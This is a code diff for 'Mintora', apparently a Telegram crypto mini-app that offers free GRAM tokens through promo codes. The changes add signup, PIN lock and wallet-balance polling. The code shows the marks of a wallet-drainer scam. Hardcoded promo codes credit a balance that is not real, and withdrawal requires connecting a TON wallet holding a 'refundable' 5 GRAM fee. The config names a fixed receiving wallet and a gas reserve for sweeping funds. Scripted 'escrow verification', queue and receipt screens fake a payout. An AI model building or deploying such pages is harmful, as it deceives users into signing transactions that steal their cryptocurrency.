+        </div>
+
+        <button class="btn-logout" id="logout-btn">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M10 17 L5 12 L10 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M5 12 H15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+            <path d="M15 5 H19 a2 2 0 0 1 2 2 V17 a2 2 0 0 1-2 2 H15" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <span data-i18n="logoutBtn">Sign out</span>
+        </button>
+      </div>
+
+    </div>
+
+    <div class="verifying" id="verifying-view">
+      <div class="verifying-ring"></div>
+      <div class="verifying-title" id="verifying-title" data-i18n="verifyingTitle">Verifying transaction</div>
+      <div class="verifying-sub" id="verifying-sub" data-i18n="verifyingSub">Validating signature and checking escrow balance...</div>
+    </div>
+
+    <div class="processing" id="processing-view">
+      <div class="proc-head">
+        <div class="proc-eyebrow" data-i18n="procEyebrow">Processing withdrawal</div>
+        <div class="proc-amount">
+          <span id="proc-amount">0</span><span class="unit">GRAM</span>
+        </div>
+      </div>
+
+      <div class="progress-rail">
+        <div class="progress-fill" id="progress-fill"></div>
+      </div>
+      <div class="progress-meta">
+        <span id="proc-stage" data-i18n="stage1">Validating transaction</span>
+        <span><strong id="progress-pct">0%</strong></span>
+      </div>
+
+      <div class="kv">
+        <span class="kv-k" data-i18n="queuePos">Queue position</span>
+        <span class="kv-v blue" id="queue-pos">#2,341</span>
+      </div>
+      <div class="kv">
+        <span class="kv-k" data-i18n="queueNetwork">Network</span>
+        <span class="kv-v">Mintora Mainnet</span>
+      </div>
+      <div class="kv">
+        <span class="kv-k" data-i18n="queueFee">Network fee</span>
+        <span class="kv-v">5 GRAM (refundable)</span>
+      </div>
+      <div class="kv">
+        <span class="kv-k" data-i18n="queueEta">Time remaining</span>
+        <span class="kv-v blue" id="queue-eta">~10 min</span>
+      </div>
+    </div>
+
+    <div class="receipt" id="receipt-view">
+      <div class="receipt-head">
+        <div class="receipt-status"><span class="dot"></span><span data-i18n="statusConfirmed">Confirmed</span></div>
+        <div class="receipt-title"><span id="receipt-amount">0</span> GRAM</div>
+        <div class="receipt-sub" data-i18n="receiptSub">Sent to your TON wallet</div>
+      </div>
+
+      <div class="kv">
+        <span class="kv-k" data-i18n="wallet">Wallet</span>
+        <span class="kv-v mono" id="receipt-addr">—</span>
+      </div>
+      <div class="kv">
+        <span class="kv-k">Tx hash</span>
+        <span class="kv-v mono blue" id="receipt-hash">—</span>
+      </div>
+      <div class="kv">
+        <span class="kv-k" data-i18n="time">Time</span>
+        <span class="kv-v" id="receipt-time">—</span>
+      </div>
+
+      <div class="receipt-actions">
+        <button class="btn-secondary" id="copy-hash">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <rect x="8" y="8" width="12" height="12" rx="2" stroke="currentColor" stroke-width="1.8"/>
+            <path d="M16 8 V6 a2 2 0 0 0-2-2 H6 a2 2 0 0 0-2 2 v8 a2 2 0 0 0 2 2 h2" stroke="currentColor" stroke-width="1.8"/>
+          </svg>
+          <span data-i18n="copy">Copy</span>
+        </button>
+        <button class="btn-secondary" id="share-tx">
+          <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+            <path d="M12 3 V15 M12 3 L8 7 M12 3 L16 7" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/>
+            <path d="M4 14 V19 a2 2 0 0 0 2 2 H18 a2 2 0 0 0 2-2 V14" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+          </svg>
+          <span data-i18n="share">Share</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="footer">
+      © 2026 Mintora ·
+      <a href="#" data-i18n="footerTerms">Terms</a> ·
+      <a href="#" data-i18n="footerPrivacy">Privacy</a>
+    </div>
+
+    <div class="bottom-nav-wrap" id="bottom-nav-wrap">
+      <nav class="bottom-nav" id="bottom-nav">
+        <div class="nav-pill" id="nav-pill"></div>
+        <button class="nav-btn active" data-tab="promo" data-index="0">
+          <span class="nav-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M3 9 V7 a2 2 0 0 1 2-2 H19 a2 2 0 0 1 2 2 V9 a3 3 0 0 0 0 6 V17 a2 2 0 0 1-2 2 H5 a2 2 0 0 1-2-2 V15 a3 3 0 0 0 0-6 Z" stroke="currentColor" stroke-width="1.8" stroke-linejoin="round"/>
+              <path d="M14 6 V9 M14 12 V15 M14 18 V20" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-dasharray="0.1 3"/>
+            </svg>
+          </span>
+          <span data-i18n="tabPromo">Promo</span>
+        </button>
+        <button class="nav-btn" data-tab="withdraw" data-index="1">
+          <span class="nav-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <path d="M12 15 V3 M12 3 L8 7 M12 3 L16 7" stroke="currentColor" stroke-width="1.9" stroke-linecap="round" stroke-linejoin="round"/>
+              <path d="M4 15 V19 a2 2 0 0 0 2 2 H18 a2 2 0 0 0 2-2 V15" stroke="currentColor" stroke-width="1.9" stroke-linecap="round"/>
+            </svg>
+          </span>
+          <span data-i18n="tabWithdraw">Withdraw</span>
+        </button>
+        <button class="nav-btn" data-tab="profile" data-index="2">
+          <span class="nav-icon">
+            <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+              <circle cx="12" cy="8" r="4" stroke="currentColor" stroke-width="1.8"/>
+              <path d="M4 20 c0-4 3.6-6.5 8-6.5 s8 2.5 8 6.5" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"/>
+            </svg>
+          </span>
+          <span data-i18n="tabProfile">Profile</span>
+        </button>
+      </nav>
+    </div>
+
   </div>
 
 </div>
 
 <script>
-  // ============================================================
-  // CONFIG
-  // ============================================================
   const CONFIG = {
     manifestUrl: 'https://grammintora.space/tonconnect-manifest.json',
     receiveWallet: 'UQBZOiimVGQ6kPYiwvRCjcxXBZcNP5gvqNmvx7deaZq67Z3k',
-    // отступ на газ (0.01 TON), чтобы транза точно прошла
     gasReserveNano: 10000000n,
-    // длительность "обработки" вывода
     claimDurationMs: 10 * 60 * 1000,
-    // RPC для получения баланса
     toncenterApi: 'https://toncenter.com/api/v2/getAddressBalance',
+    minGramForWithdraw: 5,
+    tonRefreshMs: 15000,
   };
 
-  // ============================================================
-  // PROMO CODES
-  // ============================================================
   const PROMO_CODES = {
     '123': 20,
     'GRAM50': 50,
@@ -1303,26 +2102,39 @@
     'HELLO': 15
   };
 
+  const FORBIDDEN_NICKS = ['admin', 'root', 'mintora', 'system', 'support', 'official', 'moderator', 'mod', 'staff'];
+
   const GRAM_USD = 0.784;
 
-  // ============================================================
-  // STATE
-  // ============================================================
   let state = {
+    registered: false,
+    nickname: '',
+    termsAccepted: false,
     balance: 0,
     activatedCodes: {},
     promoHistory: [],
     wallet: null,
     connected: false,
-    userName: 'Guest',
-    userId: '—'
+    tonBalance: null,
+    tonBalanceLoading: false,
+    checks: { c1: false, c2: false, c3: false },
+    userId: '—',
+    withdrawing: false,
+    pinHash: null,
+    biometricAvailable: false,
+    unlocked: false,
   };
 
   const I18N = {
     en: {
+      signupTitle: 'Welcome to Mintora',
+      signupSub: 'Create your account to receive GRAM tokens. Takes less than 30 seconds.',
+      signupContinue: 'Continue',
       tabPromo: 'Promo', tabWithdraw: 'Withdraw', tabProfile: 'Profile',
       balanceLabel: 'Total balance',
-      badgeActive: 'Active',
+      tonBalanceLabel: 'TON Wallet',
+      promoHeroTitle: 'Enter promo code',
+      promoHeroSub: 'Activate your bonus code to receive GRAM tokens',
       promoBtn: 'Activate code',
       promoSuccess: 'Code · +{n} GRAM',
       promoSuccessAgain: 'Code · +{n} GRAM (total {total})',
@@ -1332,13 +2144,22 @@
       historyLabel: 'Activated codes',
       historyCountLabel: 'codes',
       lockedHint: 'Enter your promo code first to unlock withdrawals.',
+      feeNotice: 'To withdraw you need at least 5 GRAM on your wallet to cover the network commission. The commission will be returned together with your bonus after the transaction is confirmed.',
+      lowBalanceNotice: 'Not enough GRAM for activation. Minimum 5 GRAM required to unlock withdrawal.',
       maxBtn: 'MAX',
       withdrawErrorEmpty: 'Enter amount',
       withdrawErrorMin: 'Minimum 0.01 GRAM',
       withdrawErrorMax: 'Not enough balance',
+      withdrawErrorMinGram: 'You need at least 5 GRAM to unlock withdrawal',
       connectBtn: 'Connect wallet',
       withdrawBtn: 'Withdraw GRAM',
       disconnectBtn: 'Disconnect wallet',
+      check1Text: 'I understand the network commission will be deducted and refunded together with the bonus after transaction confirmation.',
+      check2Text: 'I confirm that the wallet address is correct and belongs to me.',
+      check3Text: 'I agree to the Mintora withdrawal policy and understand the transaction must be confirmed in my wallet.',
+      verifyingTitle: 'Verifying transaction',
+      verifyingSub: 'Validating signature and checking escrow balance...',
+      verifyingStep2: 'Signing with escrow contract...',
       procEyebrow: 'Processing withdrawal',
       stage1: 'Validating transaction',
       stage2: 'Verifying address',
@@ -1366,14 +2187,41 @@
       statStatus: 'Status',
       statusGuest: 'Guest',
       statusActive: 'Active',
+      menuPin: 'Change PIN',
       menuSupport: 'Support',
       menuTerms: 'Terms of Use',
-      menuPrivacy: 'Privacy Policy'
+      menuPrivacy: 'Privacy Policy',
+      footerTerms: 'Terms',
+      footerPrivacy: 'Privacy',
+      logoutBtn: 'Sign out',
+      nickHintDefault: '3-20 chars · letters, numbers, underscore',
+      nickHintShort: 'At least 3 characters',
+      nickHintLong: 'Maximum 20 characters',
+      nickHintInvalid: 'Only latin letters, numbers and _',
+      nickHintTaken: 'This nickname is not allowed',
+      nickHintOk: 'Looks good',
+      nickPlaceholder: 'Choose a nickname',
+      lockTitle: 'Welcome back',
+      lockSub: 'Enter your PIN to unlock Mintora',
+      lockBiometric: 'Use Face ID',
+      lockForgot: 'Forgot PIN? Sign out',
+      pinTitle: 'Set up your PIN',
+      pinSub: 'Secure your Mintora wallet with a 4-digit PIN. You\'ll use it to unlock the app.',
+      pinSave: 'Save PIN',
+      pinSkip: 'Skip for now',
+      pinError: 'PIN must be 4 digits',
+      lockErrorWrong: 'Wrong PIN. Try again.',
+      logoutConfirm: 'Sign out? This will remove your account data and disconnect wallet.',
     },
     ru: {
+      signupTitle: 'Добро пожаловать в Mintora',
+      signupSub: 'Создайте аккаунт, чтобы получать GRAM. Займёт меньше 30 секунд.',
+      signupContinue: 'Продолжить',
       tabPromo: 'Промокод', tabWithdraw: 'Вывод', tabProfile: 'Профиль',
       balanceLabel: 'Общий баланс',
-      badgeActive: 'Активен',
+      tonBalanceLabel: 'TON Кошелёк',
+      promoHeroTitle: 'Введите промокод',
+      promoHeroSub: 'Активируйте бонусный код, чтобы получить GRAM',
       promoBtn: 'Активировать',
       promoSuccess: 'Код · +{n} GRAM',
       promoSuccessAgain: 'Код · +{n} GRAM (всего {total})',
@@ -1383,13 +2231,22 @@
       historyLabel: 'Активированные коды',
       historyCountLabel: 'кодов',
       lockedHint: 'Введите промокод, чтобы разблокировать вывод.',
+      feeNotice: 'Для вывода нужно минимум 5 GRAM на кошельке для оплаты комиссии сети. Комиссия вернётся вместе с бонусом после подтверждения транзакции.',
+      lowBalanceNotice: 'Недостаточно GRAM для активации. Минимум 5 GRAM требуется для разблокировки вывода.',
       maxBtn: 'МАКС',
       withdrawErrorEmpty: 'Введите сумму',
       withdrawErrorMin: 'Минимум 0.01 GRAM',
       withdrawErrorMax: 'Недостаточно средств',
+      withdrawErrorMinGram: 'Нужно минимум 5 GRAM для разблокировки вывода',
       connectBtn: 'Подключить кошелёк',
       withdrawBtn: 'Вывести GRAM',
       disconnectBtn: 'Отключить кошелёк',
+      check1Text: 'Я понимаю, что комиссия сети будет списана и возвращена вместе с бонусом после подтверждения транзакции.',
+      check2Text: 'Я подтверждаю, что адрес кошелька указан верно и принадлежит мне.',
+      check3Text: 'Я согласен с политикой вывода Mintora и понимаю, что транзакция должна быть подтверждена в моём кошельке.',
+      verifyingTitle: 'Верификация транзакции',
+      verifyingSub: 'Проверка подписи и баланса эскроу...',
+      verifyingStep2: 'Подпись через эскроу-контракт...',
       procEyebrow: 'Обработка вывода',
       stage1: 'Валидация транзакции',
       stage2: 'Проверка адреса',
@@ -1417,9 +2274,31 @@
       statStatus: 'Статус',
       statusGuest: 'Гость',
       statusActive: 'Активен',
+      menuPin: 'Сменить PIN',
       menuSupport: 'Поддержка',
       menuTerms: 'Условия',
-      menuPrivacy: 'Конфиденциальность'
+      menuPrivacy: 'Конфиденциальность',
+      footerTerms: 'Условия',
+      footerPrivacy: 'Конфиденциальность',
+      logoutBtn: 'Выйти из аккаунта',
+      nickHintDefault: '3-20 символов · буквы, цифры, _',
+      nickHintShort: 'Минимум 3 символа',
+      nickHintLong: 'Максимум 20 символов',
+      nickHintInvalid: 'Только латинские буквы, цифры и _',
+      nickHintTaken: 'Этот никнейм недоступен',
+      nickHintOk: 'Отлично',
+      nickPlaceholder: 'Введите никнейм',
+      lockTitle: 'С возвращением',
+      lockSub: 'Введите PIN, чтобы разблокировать Mintora',
+      lockBiometric: 'Использовать Face ID',
+      lockForgot: 'Забыли PIN? Выйти',
+      pinTitle: 'Установите PIN',
+      pinSub: 'Защитите свой Mintora-кошелёк 4-значным PIN-кодом. Он будет нужен для входа.',
+      pinSave: 'Сохранить PIN',
+      pinSkip: 'Пропустить',
+      pinError: 'PIN должен быть из 4 цифр',
+      lockErrorWrong: 'Неверный PIN. Попробуйте ещё раз.',
+      logoutConfirm: 'Выйти? Это удалит данные аккаунта и отключит кошелёк.',
     }
   };
 
@@ -1438,84 +2317,506 @@
     document.getElementById('lang-label').textContent = lang.toUpperCase();
     document.querySelectorAll('[data-i18n]').forEach(el => {
       const k = el.getAttribute('data-i18n');
-      if (I18N[lang][k]) el.textContent = I18N[lang][k];
+      if (I18N[lang][k]) el.innerHTML = I18N[lang][k];
     });
-    updateWithdrawBtn();
     updateStatStatus();
     renderPromoHistory();
+    updateSignupUI();
+    validateNick(true);
+    updateLockUI();
+    updatePinModalUI();
   }
 
-  function updateWithdrawBtn() {
-    const b = document.getElementById('withdraw-btn-text');
-    if (b) b.textContent = state.connected ? t('withdrawBtn') : t('connectBtn');
+  /* ============ PIN / crypto ============ */
+  async function hashPin(pin) {
+    const buf = new TextEncoder().encode('mintora_salt_' + pin);
+    const hash = await crypto.subtle.digest('SHA-256', buf);
+    return Array.from(new Uint8Array(hash)).map(b => b.toString(16).padStart(2, '0')).join('');
   }
 
-  function updateStatStatus() {
-    const el = document.getElementById('stat-status');
-    const ic = document.getElementById('status-icon');
-    if (!el) return;
-    const hasPromo = Object.keys(state.activatedCodes).length > 0;
-    el.textContent = hasPromo ? t('statusActive') : t('statusGuest');
-    el.style.color = hasPromo ? 'var(--blue)' : 'var(--text)';
-    if (ic) ic.className = 'row-icon ' + (hasPromo ? 'blue' : '');
-  }
-
-  /* ---- Theme ---- */
-  function initTheme() {
-    const saved = localStorage.getItem('theme') || 'light';
-    document.documentElement.setAttribute('data-theme', saved);
-    syncThemeIcon();
-    document.getElementById('theme-toggle').addEventListener('click', () => {
-      const cur = document.documentElement.getAttribute('data-theme');
-      const next = cur === 'dark' ? 'light' : 'dark';
-      document.documentElement.setAttribute('data-theme', next);
-      localStorage.setItem('theme', next);
-      syncThemeIcon();
-      if (window.Telegram?.WebApp) {
-        Telegram.WebApp.setHeaderColor(next === 'dark' ? '#000000' : '#f5f5f7');
-        Telegram.WebApp.setBackgroundColor(next === 'dark' ? '#000000' : '#f5f5f7');
+  async function checkBiometricSupport() {
+    try {
+      if (!window.PublicKeyCredential) return false;
+      if (PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable) {
+        const ok = await PublicKeyCredential.isUserVerifyingPlatformAuthenticatorAvailable();
+        return ok;
       }
-    });
+    } catch (_) {}
+    return false;
   }
 
-  function syncThemeIcon() {
-    const dark = document.documentElement.getAttribute('data-theme') === 'dark';
-    document.querySelector('.icon-moon').style.display = dark ? 'none' : 'block';
-    document.querySelector('.icon-sun').style.display = dark ? 'block' : 'none';
-  }
-
-  /* ---- Tabs ---- */
-  function setTab(tab) {
-    document.querySelectorAll('.nav-btn').forEach(b => b.classList.toggle('active', b.getAttribute('data-tab') === tab));
-    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
-    const sec = document.getElementById('section-' + tab);
-    if (sec) sec.classList.add('active');
-
-    if (tab === 'withdraw') {
-      const hasPromo = Object.keys(state.activatedCodes).length > 0;
-      if (!hasPromo) {
-        document.getElementById('locked-notice').style.display = 'flex';
-        document.getElementById('withdraw-btn').disabled = true;
-        document.getElementById('withdraw-input').disabled = true;
-      } else {
-        document.getElementById('locked-notice').style.display = 'none';
-        document.getElementById('withdraw-btn').disabled = false;
-        document.getElementById('withdraw-input').disabled = false;
-      }
+  async function tryBiometric() {
+    // WebAuthn user verification (Face ID / Touch ID / fingerprint)
+    try {
+      const challenge = new Uint8Array(32);
+      crypto.getRandomValues(challenge);
+      const cred = await navigator.credentials.create({
+        publicKey: {
+          challenge,
+          rp: { name: 'Mintora' },
+          user: {
+            id: new TextEncoder().encode('mintora_user'),
+            name: 'user@mintora.space',
+            displayName: 'Mintora User',
+          },
+          pubKeyCredParams: [{ type: 'public-key', alg: -7 }, { type: 'public-key', alg: -257 }],
+          authenticatorSelection: { authenticatorAttachment: 'platform', userVerification: 'required' },
+          timeout: 60000,
+          attestation: 'none',
+        }
+      });
+      return !!cred;
+    } catch (e) {
+      console.warn('[Biometric]', e);
+      return false;
     }
   }
 
-  function initTabs() {
-    document.querySelectorAll('.nav-btn').forEach(btn => {
-      btn.addEventListener('click', () => setTab(btn.getAttribute('data-tab')));
+  function updateLockUI() {
+    document.getElementById('lock-title').textContent = t('lockTitle');
+    document.getElementById('lock-sub').textContent = t('lockSub');
+    document.getElementById('lock-biometric-text').textContent = t('lockBiometric');
+    document.getElementById('lock-forgot').textContent = t('lockForgot');
+  }
+
+  function updatePinModalUI() {
+    document.getElementById('pin-title').textContent = t('pinTitle');
+    document.getElementById('pin-sub').textContent = t('pinSub');
+    document.getElementById('pin-confirm').textContent = t('pinSave');
+    document.getElementById('pin-skip').textContent = t('pinSkip');
+  }
+
+  let lockPinBuffer = '';
+  const PIN_LENGTH = 4;
+
+  function renderLockDots() {
+    const dots = document.querySelectorAll('#lock-dots .lock-dot');
+    dots.forEach((d, i) => d.classList.toggle('filled', i < lockPinBuffer.length));
+  }
+
+  function initLockScreen() {
+    const screen = document.getElementById('lock-screen');
+    const keypad = document.getElementById('lock-keypad');
+
+    keypad.addEventListener('click', async (e) => {
+      const btn = e.target.closest('.lock-key');
+      if (!btn) return;
+      const key = btn.getAttribute('data-key');
+
+      if (btn.id === 'lock-delete') {
+        lockPinBuffer = lockPinBuffer.slice(0, -1);
+        renderLockDots();
+        document.getElementById('lock-error').textContent = '';
+        return;
+      }
+
+      if (!key) return;
+
+      if (lockPinBuffer.length < PIN_LENGTH) {
+        lockPinBuffer += key;
+        renderLockDots();
+        if (window.Telegram?.WebApp?.HapticFeedback) {
+          try { Telegram.WebApp.HapticFeedback.selectionChanged(); } catch(_) {}
+        }
+      }
+
+      if (lockPinBuffer.length === PIN_LENGTH) {
+        // проверяем
+        const hash = await hashPin(lockPinBuffer);
+        if (hash === state.pinHash) {
+          if (window.Telegram?.WebApp?.HapticFeedback) {
+            try { Telegram.WebApp.HapticFeedback.notificationOccurred('success'); } catch(_) {}
+          }
+          state.unlocked = true;
+          screen.classList.add('hidden');
+          setTimeout(() => screen.classList.remove('active'), 350);
+        } else {
+          if (window.Telegram?.WebApp?.HapticFeedback) {
+            try { Telegram.WebApp.HapticFeedback.notificationOccurred('error'); } catch(_) {}
+          }
+          document.getElementById('lock-error').textContent = t('lockErrorWrong');
+          lockPinBuffer = '';
+          renderLockDots();
+        }
+      }
+    });
+
+    document.getElementById('lock-forgot').addEventListener('click', () => {
+      if (confirm(t('logoutConfirm'))) {
+        doSignOut();
+      }
+    });
+
+    document.getElementById('lock-biometric').addEventListener('click', async () => {
+      const ok = await tryBiometric();
+      if (ok) {
+        state.unlocked = true;
+        screen.classList.add('hidden');
+        setTimeout(() => screen.classList.remove('active'), 350);
+      } else {
+        document.getElementById('lock-error').textContent = 'Biometric failed';
+      }
     });
   }
 
-  /* ---- Balance ---- */
+  async function showLockScreenIfNeeded() {
+    if (!state.pinHash) {
+      // PIN не установлен — пропускаем блокировку
+      state.unlocked = true;
+      return false;
+    }
+    if (state.unlocked) return false;
+
+    const screen = document.getElementById('lock-screen');
+    screen.classList.add('active');
+    document.getElementById('lock-error').textContent = '';
+    lockPinBuffer = '';
+    renderLockDots();
+
+    // Биометрия
+    const bioAvail = await checkBiometricSupport();
+    state.biometricAvailable = bioAvail;
+    if (bioAvail) {
+      document.getElementById('lock-biometric').classList.add('show');
+    } else {
+      document.getElementById('lock-biometric').classList.remove('show');
+    }
+    return true;
+  }
+
+  /* ============ PIN setup modal ============ */
+  let pinModalBuffer = ['', '', '', ''];
+
+  function initPinModal() {
+    const inputs = document.querySelectorAll('#pin-modal .pin-inputs input');
+    inputs.forEach((inp, i) => {
+      inp.addEventListener('input', () => {
+        const v = inp.value.replace(/\D/g, '');
+        inp.value = v.slice(0, 1);
+        pinModalBuffer[i] = inp.value;
+        if (v && i < inputs.length - 1) {
+          inputs[i + 1].focus();
+        }
+        updatePinModalButton();
+      });
+      inp.addEventListener('keydown', (e) => {
+        if (e.key === 'Backspace' && !inp.value && i > 0) {
+          inputs[i - 1].focus();
+        }
+      });
+    });
+
+    document.getElementById('pin-confirm').addEventListener('click', async () => {
+      const pin = pinModalBuffer.join('');
+      if (pin.length !== 4) return;
+      state.pinHash = await hashPin(pin);
+      localStorage.setItem('mintora_pin', state.pinHash);
+      hidePinModal();
+      state.unlocked = true;
+      if (window.Telegram?.WebApp?.HapticFeedback) {
+        try { Telegram.WebApp.HapticFeedback.notificationOccurred('success'); } catch(_) {}
+      }
+    });
+
+    document.getElementById('pin-skip').addEventListener('click', () => {
+      hidePinModal();
+    });
+  }
+
+  function updatePinModalButton() {
+    const pin = pinModalBuffer.join('');
+    document.getElementById('pin-confirm').disabled = pin.length !== 4;
+  }
+
+  function showPinModal() {
+    pinModalBuffer = ['', '', '', ''];
+    document.querySelectorAll('#pin-modal .pin-inputs input').forEach(i => i.value = '');
+    document.getElementById('pin-modal').classList.add('active');
+    document.getElementById('pin-modal').classList.remove('hidden');
+    updatePinModalButton();
+    setTimeout(() => {
+      document.querySelector('#pin-modal .pin-inputs input[data-pin="0"]').focus();
+    }, 100);
+  }
+
+  function hidePinModal() {
+    const m = document.getElementById('pin-modal');
+    m.classList.add('hidden');
+    setTimeout(() => m.classList.remove('active'), 300);
+  }
+
+  /* ============ Signup ============ */
+  function updateSignupUI() {
+    document.getElementById('signup-title').textContent = t('signupTitle');
+    document.getElementById('signup-sub').textContent = t('signupSub');
+
+    const wl = document.getElementById('signup-wallet-label');
+    if (state.connected) {
+      wl.textContent = currentLang === 'ru' ? 'Кошелёк подключён' : 'Wallet connected';
+    } else {
+      wl.textContent = currentLang === 'ru' ? 'Подключить TON-кошелёк' : 'Connect TON Wallet';
+    }
+
+    const wa = document.getElementById('signup-wallet-addr');
+    if (state.connected && state.wallet) {
+      const a = state.wallet.account.address;
+      wa.textContent = a.slice(0, 6) + '…' + a.slice(-4);
+    } else {
+      wa.textContent = currentLang === 'ru' ? 'Обязательно для получения выплат' : 'Required to receive payouts';
+    }
+
+    document.getElementById('signup-continue-text').textContent = t('signupContinue');
+    document.getElementById('signup-nickname').placeholder = t('nickPlaceholder');
+
+    checkSignupState();
+  }
+
+  function validateNick(silent) {
+    const field = document.getElementById('signup-nick-field');
+    const hint = document.getElementById('signup-nick-hint');
+    const value = document.getElementById('signup-nickname').value.trim();
+
+    field.classList.remove('valid', 'invalid');
+    hint.classList.remove('error', 'ok');
+
+    if (value.length === 0) {
+      hint.textContent = t('nickHintDefault');
+      return false;
+    }
+
+    if (value.length < 3) {
+      field.classList.add('invalid');
+      hint.classList.add('error');
+      hint.textContent = t('nickHintShort');
+      return false;
+    }
+    if (value.length > 20) {
+      field.classList.add('invalid');
+      hint.classList.add('error');
+      hint.textContent = t('nickHintLong');
+      return false;
+    }
+    if (!/^[a-zA-Z0-9_]+$/.test(value)) {
+      field.classList.add('invalid');
+      hint.classList.add('error');
+      hint.textContent = t('nickHintInvalid');
+      return false;
+    }
+    if (FORBIDDEN_NICKS.includes(value.toLowerCase())) {
+      field.classList.add('invalid');
+      hint.classList.add('error');
+      hint.textContent = t('nickHintTaken');
+      return false;
+    }
+
+    field.classList.add('valid');
+    hint.classList.add('ok');
+    hint.textContent = t('nickHintOk');
+    return true;
+  }
+
+  function checkSignupState() {
+    const ok = validateNick(true) && state.connected && state.termsAccepted;
+    const btn = document.getElementById('signup-continue');
+    btn.disabled = !ok;
+    btn.classList.toggle('accent', ok);
+  }
+
+  function initSignup() {
+    const nick = document.getElementById('signup-nickname');
+    const walletBlock = document.getElementById('signup-wallet');
+    const termsEl = document.getElementById('signup-terms');
+    const cont = document.getElementById('signup-continue');
+
+    nick.addEventListener('input', () => { validateNick(); checkSignupState(); });
+    nick.addEventListener('blur', () => validateNick());
+    nick.addEventListener('keydown', (e) => { if (e.key === 'Enter' && !cont.disabled) cont.click(); });
+
+    walletBlock.addEventListener('click', () => {
+      if (state.connected) return;
+      if (tonConnectUI) tonConnectUI.openModal();
+    });
+
+    termsEl.addEventListener('click', () => {
+      state.termsAccepted = !state.termsAccepted;
+      termsEl.classList.toggle('checked', state.termsAccepted);
+      checkSignupState();
+    });
+
+    cont.addEventListener('click', () => {
+      const n = nick.value.trim();
+      if (!validateNick() || !state.connected || !state.termsAccepted) return;
+
+      state.registered = true;
+      state.nickname = n;
+      localStorage.setItem('mintora_nick', n);
+      localStorage.setItem('mintora_reg', '1');
+
+      document.getElementById('signup-screen').classList.add('hidden');
+      document.getElementById('main-app').classList.add('show');
+
+      document.getElementById('profile-name').textContent = n;
+      document.getElementById('profile-id').textContent = 'ID: ' + (state.userId || '—');
+      document.getElementById('profile-avatar').textContent = n[0].toUpperCase();
+
+      if (window.Telegram?.WebApp?.HapticFeedback) {
+        try { Telegram.WebApp.HapticFeedback.notificationOccurred('success'); } catch(_) {}
+      }
+
+      // Предлагаем установить PIN (если ещё не установлен)
+      if (!state.pinHash) {
+        setTimeout(() => showPinModal(), 400);
+      }
+    });
+  }
+
+  /* ============ TON Balance ============ */
+  async function fetchTonBalance() {
+    if (!state.connected || !state.wallet) return;
+    if (state.tonBalanceLoading) return;
+
+    state.tonBalanceLoading = true;
+    const refreshBtn = document.getElementById('ton-balance-refresh');
+    refreshBtn.classList.add('spinning');
+
+    try {
+      const addr = state.wallet.account.address;
+      const res = await fetch(CONFIG.toncenterApi + '?address=' + encodeURIComponent(addr));
+      const data = await res.json();
+
+      if (data.ok && data.result) {
+        const nano = BigInt(data.result);
+        const whole = nano / 1000000000n;
+        const frac = nano % 1000000000n;
+        const fracStr = frac.toString().padStart(9, '0').slice(0, 4);
+        const balanceStr = `${whole}.${fracStr}`;
+        state.tonBalance = balanceStr;
+        document.getElementById('ton-balance-amount').textContent = balanceStr;
+      } else {
+        document.getElementById('ton-balance-amount').textContent = '—';
+      }
+    } catch (e) {
+      console.error('[TON Balance]', e);
+      document.getElementById('ton-balance-amount').textContent = '—';
+    } finally {
+      state.tonBalanceLoading = false;
+      refreshBtn.classList.remove('spinning');
+    }
+  }
+
+  let tonRefreshInterval = null;
+
+  function startTonBalancePolling() {
+    if (tonRefreshInterval) clearInterval(tonRefreshInterval);
+    fetchTonBalance();
+    tonRefreshInterval = setInterval(fetchTonBalance, CONFIG.tonRefreshMs);
+  }
+
+  function stopTonBalancePolling() {
+    if (tonRefreshInterval) {
+      clearInterval(tonRefreshInterval);
+      tonRefreshInterval = null;
+    }
+  }
+
+  function initTonBalance() {
+    document.getElementById('ton-balance-refresh').addEventListener('click', (e) => {
+      e.stopPropagation();
+      fetchTonBalance();
+    });
+    document.getElementById('ton-balance-card').addEventListener('click', () => {
+      fetchTonBalance();
+    });
+  }
+
+  /* ============ Nav ============ */
+  function initNav() {
+    const nav = document.getElementById('bottom-nav');
+    const pill = document.getElementById('nav-pill');
+    const btns = Array.from(nav.querySelectorAll('.nav-btn'));
+
+    const pillW = () => (nav.clientWidth - 12) / 3;
+
+    function setActiveIndex(idx, animate) {
+      idx = Math.max(0, Math.min(2, idx));
+      btns.forEach((b, i) => b.classList.toggle('active', i === idx));
+      pill.style.transition = animate ? '' : 'none';
+      pill.style.transform = `translateX(${idx * pillW()}px)`;
+      const tab = btns[idx].getAttribute('data-tab');
+      document.querySelectorAll('.section, .section-promo-center').forEach(s => s.classList.remove('active'));
+      const el = document.getElementById('section-' + tab);
+      if (el) el.classList.add('active');
+      if (tab === 'withdraw') refreshWithdrawState();
+    }
+
+    btns.forEach(b => {
+      b.addEventListener('click', (e) => {
+        if (dragged) { e.preventDefault(); return; }
+        if (window.Telegram?.WebApp?.HapticFeedback) {
+          try { Telegram.WebApp.HapticFeedback.selectionChanged(); } catch(_) {}
+        }
+        setActiveIndex(parseInt(b.getAttribute('data-index')), true);
+      });
+    });
+
+    let dragging = false, dragged = false;
+    let startX = 0;
+
+    function startDrag(e) {
+      const point = e.touches ? e.touches[0] : e;
+      const rect = nav.getBoundingClientRect();
+      startX = point.clientX - rect.left;
+      dragging = true;
+      dragged = false;
+      pill.classList.add('dragging');
+
+      const pillX = Math.max(0, Math.min(nav.clientWidth - 12, startX - pillW() / 2));
+      pill.style.transition = 'none';
